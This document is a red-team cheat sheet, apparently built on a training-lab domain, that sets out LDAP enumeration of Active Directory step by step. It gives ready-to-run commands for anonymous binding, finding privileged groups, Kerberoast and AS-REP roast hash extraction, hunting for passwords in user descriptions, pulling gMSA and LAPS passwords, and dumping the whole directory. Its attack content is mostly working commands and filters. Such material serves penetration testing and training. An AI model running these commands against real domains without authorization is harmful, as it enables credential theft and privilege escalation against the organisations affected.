# 03 — LDAP Enumeration Commands

> [!TIP]
> LDAP (Lightweight Directory Access Protocol) is the fundamental query protocol for Active Directory domain controllers (Ports 389/tcp for LDAP, 636/tcp for LDAPS, 3268/tcp for Global Catalog, 3269/tcp for Global Catalog SSL). This page presents LDAP enumeration commands ordered strictly by operational red team execution workflow—from initial unauthenticated recon to advanced object and delegation extraction.

---

## Step 1 — Unauthenticated / Pre-Auth LDAP Recon

Before establishing domain user credentials, test for anonymous LDAP binding or NULL session information leakage.

```bash
# Anonymous / Unauthenticated LDAP search via OpenLDAP
ldapsearch -x -H ldap://<DC_IP> -b "DC=dcorp,DC=local" "(objectClass=*)"

# Search LDAPS (Port 636) without SSL certificate verification
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://<DC_IP>:636 -b "DC=dcorp,DC=local" "(objectClass=*)"
```

```powershell
# Native PowerShell Living-off-the-Land Anonymous search
$searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://<DC_IP>/DC=dcorp,DC=local")
$searcher.Filter = "(objectClass=*)"
$searcher.FindAll()
```

---

## Step 2 — Domain, DC & Base DN Discovery

Discover domain boundaries, Domain Controllers, and Global Catalog endpoints.

```powershell
# PowerView: Get current domain & Domain Controllers
Get-Domain
Get-DomainController

# AD Module: Get domain & DC details
Get-ADDomain
Get-ADDomainController -Filter *
```

```bash
# Global Catalog Search (Port 3268) across multi-domain forests using ldapsearch
ldapsearch -x -H ldap://<DC_IP>:3268 -D "user@dcorp.local" -w "Password123!" -b "DC=moneycorp,DC=local" "(objectCategory=person)" samaccountname
```

---

## Step 3 — Core Directory Object Enumeration

Enumerate Users, Groups, Computers, and OUs across Native PowerShell, PowerView, AD Module, and Linux tools.

### Users & Descriptions
```powershell
# PowerView
Get-DomainUser | Select-Object samaccountname, description

# ActiveDirectory Module
Get-ADUser -Filter * -Properties Description | Select-Object samaccountname, description

# Native [adsisearcher] (No External Tools)
([adsisearcher]"(&(objectCategory=person)(objectClass=user))").FindAll() | ForEach-Object {
    [PSCustomObject]@{
        SAMAccountName = $_.Properties["samaccountname"][0]
        Description    = $_.Properties["description"][0]
    }
}
```

### Privileged Groups & Memberships
```powershell
# Enumerate Domain Admins and protected group members
Get-DomainGroupMember -Identity 'Domain Admins'
Get-ADGroupMember -Identity 'Domain Admins'

# Recursive / Nested Group Membership Query (Using LDAP_MATCHING_RULE_IN_CHAIN OID)
Get-DomainObject -LDAPFilter "(member:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=dcorp,DC=local)"
Get-ADUser -LDAPFilter "(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=dcorp,DC=local)"
```

### Computer Accounts & Operating Systems
```powershell
Get-DomainComputer | Select-Object samaccountname, dnshostname, operatingsystem
Get-ADComputer -Filter * -Properties OperatingSystem | Select-Object Name, OperatingSystem
```

---

## Step 4 — High-Value Target & Vulnerable Account Hunting

Target specific account properties that yield immediate privilege escalation or credential roasts.

### Kerberoastable Service Accounts (SPNs)
```powershell
# PowerView & AD Module
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
```bash
# NetExec LDAP Kerberoast extraction
nxe ldap <DC_IP> -u user -p 'Password123!' -d dcorp.local --kerberoast kerberoast.txt
```

### AS-REP Roastable Accounts (Pre-Auth Disabled)
```powershell
# PowerView & AD Module
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, useraccountcontrol
Get-ADUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" -Properties userAccountControl
```
```bash
# NetExec LDAP AS-REP Roast extraction
nxe ldap <DC_IP> -u user -p 'Password123!' -d dcorp.local --asreproast asrep.txt
```

### AdminSDHolder Protected Objects (`adminCount=1`)
```powershell
Get-DomainObject -LDAPFilter "(adminCount=1)" | Select-Object samaccountname, distinguishedname
Get-ADObject -LDAPFilter "(adminCount=1)" -Properties samaccountname
```

### Passwords Stored in User Descriptions
```powershell
Get-DomainUser -LDAPFilter "(description=*pass*)" | Select-Object samaccountname, description
```
```bash
nxe ldap <DC_IP> -u user -p 'Password123!' -d dcorp.local -M user-desc
```

---

## Step 5 — Delegation & Advanced Attribute Extraction

Enumerate Unconstrained, Constrained, Resource-Based Constrained Delegation (RBCD), gMSA, and LAPS settings.

### Unconstrained Delegation
```powershell
Get-DomainComputer -UnConstrained | Select-Object samaccountname, dnshostname
Get-ADComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -Properties DNSHostName
```

### Constrained Delegation & RBCD
```powershell
# Constrained Delegation
Get-DomainUser -TrustedToAuth
Get-ADObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)" -Properties msDS-AllowedToDelegateTo

# Resource-Based Constrained Delegation (RBCD)
Get-ADObject -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

### Group Managed Service Accounts (gMSA) & LAPS
```powershell
# Enumerate gMSA accounts
Get-DomainObject -LDAPFilter "(objectClass=msDS-GroupManagedServiceAccount)" | Select-Object samaccountname, msDS-GroupMSAMembership

# Enumerate LAPS-enabled computers
Get-DomainComputer -LDAPFilter "(ms-Mcs-AdmPwdExpirationTime=*)" | Select-Object samaccountname
```
```bash
# Extract gMSA & LAPS passwords via NetExec LDAP
nxe ldap <DC_IP> -u user -p 'Password123!' -d dcorp.local -M gMSA
nxe ldap <DC_IP> -u user -p 'Password123!' -d dcorp.local -M laps
```

---

## Step 6 — Automated Active Directory Dumps & Offline Snapshots

Mass-dump the Active Directory database for offline analysis when low-noise enumeration is complete.

### `ldapdomaindump` (Linux)
```bash
ldapdomaindump -u "dcorp.local\user" -p "Password123!" -o ./ldap_dump <DC_IP>
```

### `windapsearch` (Linux CLI)
```bash
python3 windapsearch.py -d dcorp.local -u user -p 'Password123!' --dc-ip <DC_IP> --custom "(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
```

### `ADExplorer.exe` & `ldp.exe` (Windows)
```cmd
# Create an offline snapshot of Active Directory using Sysinternals ADExplorer
ADExplorer.exe -snapshot "" DC01.dcorp.local AD_snapshot.dat
```
```bash
# Parse ADExplorer snapshot offline on Linux using adexplorer-snapshot-py
python3 adexplorer-snapshot.py AD_snapshot.dat OutDir/
```

---

## Step 7 — Reference Tables & Matching Rule OIDs

### Special LDAP Extensible Match OIDs

| Matching Rule OID | Name | Description | Example Usage |
| :--- | :--- | :--- | :--- |
| `1.2.840.113556.1.4.803` | `LDAP_MATCHING_RULE_BIT_AND` | Bitwise AND. True if **all** specified bits are set. | `(userAccountControl:1.2.840.113556.1.4.803:=524288)` |
| `1.2.840.113556.1.4.804` | `LDAP_MATCHING_RULE_BIT_OR` | Bitwise OR. True if **any** specified bits are set. | `(userAccountControl:1.2.840.113556.1.4.804:=2)` |
| `1.2.840.113556.1.4.1941` | `LDAP_MATCHING_RULE_IN_CHAIN` | Recursive parent/child hierarchy search (e.g. nested group memberships). | `(member:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=dcorp,DC=local)` |

### UserAccountControl (UAC) Bitmask Reference

| Bit Value | Bit Mask Flag | Attack Relevance |
| :--- | :--- | :--- |
| `2` | `ACCOUNTDISABLE` | Account is currently disabled |
| `32` | `PASSWD_NOTREQD` | No password is required for this account |
| `512` | `NORMAL_ACCOUNT` | Standard user account |
| `2048` | `INTERDOMAIN_TRUST_ACCOUNT` | Trust account for domain-to-domain trust |
| `4096` | `WORKSTATION_TRUST_ACCOUNT` | Computer account (domain member) |
| `8192` | `SERVER_TRUST_ACCOUNT` | Domain Controller computer account |
| `65536` | `DONT_EXPIRE_PASSWORD` | Account password never expires |
| `524288` | `TRUSTED_FOR_DELEGATION` | Account configured for **Unconstrained Delegation** |
| `1048576` | `NOT_DELEGATED` | Sensitive account — cannot be delegated |
| `4194304` | `DONT_REQ_PREAUTH` | Account configured for **AS-REP Roasting** (Kerberos Pre-Auth disabled) |

### High-Value LDAP Filter Quick Reference

| Attack Surface / Target | Raw LDAP Filter |
| :--- | :--- |
| **All Users** | `(&(objectCategory=person)(objectClass=user))` |
| **All Computers** | `(objectCategory=computer)` |
| **Domain Controllers** | `(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))` |
| **Kerberoastable Users** | `(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))` |
| **AS-REP Roastable Users** | `(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))` |
| **Unconstrained Delegation** | `(userAccountControl:1.2.840.113556.1.4.803:=524288)` |
| **Constrained Delegation** | `(msDS-AllowedToDelegateTo=*)` |
| **Resource-Based Constrained Delegation (RBCD)** | `(msDS-AllowedToActOnBehalfOfOtherIdentity=*)` |
| **AdminSDHolder Objects** | `(adminCount=1)` |
| **Enabled Users Only** | `(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))` |
| **gMSA Accounts** | `(objectClass=msDS-GroupManagedServiceAccount)` |
| **Foreign Security Principals (Cross-Trust)** | `(objectCategory=foreignSecurityPrincipal)` |
